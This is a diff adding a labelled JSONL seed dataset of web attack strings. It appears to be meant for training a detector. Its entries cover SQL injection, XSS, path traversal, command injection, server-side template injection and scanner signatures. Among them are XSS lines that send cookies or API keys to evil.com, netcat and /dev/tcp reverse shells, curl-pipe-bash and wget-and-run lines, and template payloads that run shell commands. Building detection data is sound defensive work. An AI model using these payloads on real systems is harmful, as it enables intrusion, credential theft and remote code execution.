@@ -1,0 +1,64 @@
+{"text": "id=1' OR '1'='1", "label": "sqli", "source": "seed"}
+{"text": "username=admin'--", "label": "sqli", "source": "seed"}
+{"text": "id=1 UNION SELECT username,password FROM users--", "label": "sqli", "source": "seed"}
+{"text": "id=1; DROP TABLE users;--", "label": "sqli", "source": "seed"}
+{"text": "id=1' AND SLEEP(5)-- -", "label": "sqli", "source": "seed"}
+{"text": "id=1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", "label": "sqli", "source": "seed"}
+{"text": "email=' OR 1=1 LIMIT 1-- -", "label": "sqli", "source": "seed"}
+{"text": "id=1 UNION ALL SELECT NULL,NULL,concat(0x7e,user(),0x7e)-- -", "label": "sqli", "source": "seed"}
+{"text": "search=%27%20OR%20%271%27%3D%271", "label": "sqli", "source": "seed"}
+{"text": "id=1)) UNION SELECT table_name,2 FROM information_schema.tables-- -", "label": "sqli", "source": "seed"}
+{"text": "cat=1' WAITFOR DELAY '0:0:5'-- -", "label": "sqli", "source": "seed"}
+{"text": "id=1' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -", "label": "sqli", "source": "seed"}
+{"text": "user=admin' OR 'x'='x' /*", "label": "sqli", "source": "seed"}
+{"text": "q=<script>alert(1)</script>", "label": "xss", "source": "seed"}
+{"text": "name=<img src=x onerror=alert(document.cookie)>", "label": "xss", "source": "seed"}
+{"text": "comment=<svg/onload=alert(1)>", "label": "xss", "source": "seed"}
+{"text": "q=\"><script>document.location='http://evil.com/?c='+document.cookie</script>", "label": "xss", "source": "seed"}
+{"text": "search=javascript:alert(document.domain)", "label": "xss", "source": "seed"}
+{"text": "name=<body onload=alert('xss')>", "label": "xss", "source": "seed"}
+{"text": "q=<iframe src=javascript:alert(1)>", "label": "xss", "source": "seed"}
+{"text": "input=<a href=\"javascript:alert(1)\">click</a>", "label": "xss", "source": "seed"}
+{"text": "q=%3Cscript%3Ealert(1)%3C%2Fscript%3E", "label": "xss", "source": "seed"}
+{"text": "msg=<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>", "label": "xss", "source": "seed"}
+{"text": "data=<script>fetch('/api/keys').then(r=>r.text()).then(t=>fetch('//evil?'+t))</script>", "label": "xss", "source": "seed"}
+{"text": "file=../../../../etc/passwd", "label": "path_traversal", "source": "seed"}
+{"text": "page=....//....//....//etc/shadow", "label": "path_traversal", "source": "seed"}
+{"text": "path=..%2f..%2f..%2f..%2fetc%2fpasswd", "label": "path_traversal", "source": "seed"}
+{"text": "include=/var/www/../../etc/passwd%00", "label": "path_traversal", "source": "seed"}
+{"text": "file=..\\..\\..\\windows\\win.ini", "label": "path_traversal", "source": "seed"}
+{"text": "template=php://filter/convert.base64-encode/resource=index.php", "label": "path_traversal", "source": "seed"}
+{"text": "doc=....//....//boot.ini", "label": "path_traversal", "source": "seed"}
+{"text": "lang=../../../../../../proc/self/environ", "label": "path_traversal", "source": "seed"}
+{"text": "img=..%252f..%252f..%252fetc%252fpasswd", "label": "path_traversal", "source": "seed"}
+{"text": "host=127.0.0.1; cat /etc/passwd", "label": "command_injection", "source": "seed"}
+{"text": "ip=8.8.8.8 && whoami", "label": "command_injection", "source": "seed"}
+{"text": "cmd=; nc -e /bin/sh 10.0.0.1 4444", "label": "command_injection", "source": "seed"}
+{"text": "target=example.com | id", "label": "command_injection", "source": "seed"}
+{"text": "host=`cat /etc/passwd`", "label": "command_injection", "source": "seed"}
+{"text": "q=$(curl http://10.0.0.1/shell.sh | bash)", "label": "command_injection", "source": "seed"}
+{"text": "file=test.txt; wget http://evil/m.sh -O /tmp/m; sh /tmp/m", "label": "command_injection", "source": "seed"}
+{"text": "ping=127.0.0.1%0Acat%20/etc/passwd", "label": "command_injection", "source": "seed"}
+{"text": "name=;bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "label": "command_injection", "source": "seed"}
+{"text": "input=| powershell -enc SQBFAFgA", "label": "command_injection", "source": "seed"}
+{"text": "name={{7*7}}", "label": "ssti", "source": "seed"}
+{"text": "q=${7*7}", "label": "ssti", "source": "seed"}
+{"text": "tpl={{config.items()}}", "label": "ssti", "source": "seed"}
+{"text": "name={{''.__class__.__mro__[1].__subclasses__()}}", "label": "ssti", "source": "seed"}
+{"text": "q={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "label": "ssti", "source": "seed"}
+{"text": "greeting=<%= 7*7 %>", "label": "ssti", "source": "seed"}
+{"text": "name=${T(java.lang.Runtime).getRuntime().exec('id')}", "label": "ssti", "source": "seed"}
+{"text": "tpl=#{7*7}", "label": "ssti", "source": "seed"}
+{"text": "name={{''.__class__.__base__.__subclasses__()[400]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}", "label": "ssti", "source": "seed"}
+{"text": "GET /admin/ HTTP/1.1 User-Agent: Mozilla/5.00 (Nikto/2.1.6)", "label": "scanner", "source": "seed"}
+{"text": "GET /phpmyadmin/ HTTP/1.1", "label": "scanner", "source": "seed"}
+{"text": "GET /.git/HEAD HTTP/1.1", "label": "scanner", "source": "seed"}
+{"text": "GET /wp-login.php HTTP/1.1 User-Agent: WPScan v3.8", "label": "scanner", "source": "seed"}
+{"text": "GET /..;/..;/manager/html HTTP/1.1", "label": "scanner", "source": "seed"}
+{"text": "User-Agent: sqlmap/1.7#stable (https://sqlmap.org)", "label": "scanner", "source": "seed"}
+{"text": "GET /server-status HTTP/1.1", "label": "scanner", "source": "seed"}
+{"text": "GET /.env HTTP/1.1", "label": "scanner", "source": "seed"}
+{"text": "GET /cgi-bin/test.cgi HTTP/1.1 User-Agent: () { :;}; echo vulnerable", "label": "scanner", "source": "seed"}
+{"text": "GET /actuator/env HTTP/1.1", "label": "scanner", "source": "seed"}
+{"text": "User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine)", "label": "scanner", "source": "seed"}
+{"text": "GET /backup.zip HTTP/1.1 User-Agent: gobuster/3.6", "label": "scanner", "source": "seed"}
